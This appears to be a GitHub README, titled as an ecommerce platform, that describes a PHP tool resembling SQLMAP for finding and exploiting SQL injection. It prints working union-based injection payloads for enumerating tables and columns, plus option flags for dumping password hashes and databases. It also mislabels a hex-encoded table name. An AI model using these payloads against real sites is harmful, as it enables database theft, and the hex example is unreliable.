# Modern-Ecommerce-Platforms
Design and Develop Modern Ecommerce Plafform

# Project Idea

Creating a tool similar to SQLMAP for web applications using HTML, PHP, HTTP requests, and SQL. It is used to hack and find SQL injection vulnerabilities by providing the URL and selecting the options, rather than writing them by hand, and checking the results at the end.

# The normal hacking without using any tool be like that 

?id=.1 union select 1,2,3,4,5,6,7,8,9,10,11,12 -- -
# To get tables
.1 union select 1,2,table_name,4,5,6,7,8,9,10,11,12 +From+Information_Schema.+tAblES+Where+table_ScHEmA=scHEMA() -- -

# Result
 categories,comments,posts,users,users_online


# To get Columns inside table need to encrypt the table name EX: posts = 0x7573657273
.1 union select 1,2,group_concat(column_name),4,5,6,7,8,9,10,11,12+froM+InfORmation_scHema.cOlumns WheRe+tAblE_naMe=0x7573657273 -- -

# Options
    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate


# Codes Screenshot 
![Screenshot from 2023-10-04 15-57-10](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/ecb2264f-a227-4a44-91d3-96c079eae332)
![Screenshot from 2023-10-04 15-57-17](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/6c6c4721-122b-49b7-af8b-22364bc15d61)
![Screenshot from 2023-10-04 15-57-23](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/3f3c7696-83bc-44ea-845c-6df7536f6656)
![Screenshot from 2023-10-04 15-57-29](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/ec532d47-9a9b-4e89-8cba-9cf4de42542d)
![Screenshot from 2023-10-04 15-57-36](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/4c76f503-5fc1-44af-b0fe-b2b0bb9f705c)
![Screenshot from 2023-10-04 16-19-34](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/c88ab7e7-4881-4fdb-950d-935531c8ff58)
![Screenshot from 2023-10-04 16-19-42](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/43ada877-1743-4b13-a302-13fbdda36d52)

# Website
![Screenshot from 2023-10-04 16-01-27](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/a9c22773-7114-4cb5-b0dd-b079f51f81a6)

